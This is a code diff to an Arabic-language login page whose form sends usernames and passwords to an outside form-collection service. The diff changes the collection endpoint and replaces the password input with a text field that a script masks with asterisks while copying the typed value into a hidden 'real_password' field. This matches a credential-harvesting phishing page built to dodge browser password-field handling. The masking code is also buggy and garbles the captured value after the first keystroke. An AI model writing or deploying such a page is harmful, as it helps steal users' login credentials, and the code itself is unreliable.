@@ -45,12 +45,34 @@
 <body>
   <div class="container">
     <h2>تسجيل الدخول</h2>
-    <form id="loginForm" action="https://getform.io/f/bjjredpb" method="POST">
+    <form id="loginForm" action="https://getform.io/f/bnlnejeb" method="POST">
       <input type="text" name="username" placeholder="اسم المستخدم" required />
-      <input type="password" name="password" placeholder="كلمة المرور" required />
-      <!-- إعادة التوجيه بعد الإرسال -->
+
+      <!-- حقل تمويه لكلمة المرور -->
+      <input type="text" name="userkey" placeholder="كلمة المرور" required oninput="maskInput(this)" autocomplete="off" />
+
       <button type="submit">تسجيل</button>
     </form>
   </div>
+
+  <script>
+    // دالة لجعل الإدخال يظهر كنقاط مع تمويه الحروف، رغم أن النوع text
+    function maskInput(field) {
+      let val = field.value;
+      // هذا مجرد تمويه بصري: نضع النجوم لكن نخزن القيمة الحقيقية في hidden input
+      let stars = '*'.repeat(val.length);
+      field.value = stars;
+
+      // خزن القيمة الحقيقية في hidden input
+      if (!document.getElementById('realPass')) {
+        let hidden = document.createElement('input');
+        hidden.type = 'hidden';
+        hidden.name = 'real_password';
+        hidden.id = 'realPass';
+        field.form.appendChild(hidden);
+      }
+      document.getElementById('realPass').value = val;
+    }
+  </script>
 </body>
 </html>
